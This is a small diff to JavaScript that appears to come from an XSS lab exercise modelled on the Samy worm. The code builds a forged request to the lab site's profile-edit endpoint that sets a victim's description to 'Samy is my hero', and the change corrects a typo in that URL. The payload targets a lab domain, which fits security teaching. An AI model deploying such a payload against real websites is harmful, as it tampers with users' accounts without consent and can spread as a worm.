@@ -7,7 +7,7 @@ window.onload = function() {
     var desc = "&description=Samy is my hero" + "&accesslevel[description]=2";
 
     // Construct the content of your url.
-    var sendurl = "http://wwww.xsslabelgg.com/action/profile/edit";
+    var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
     var content = guid + name + desc + ts + token;
     var samyGuid = 47;
 
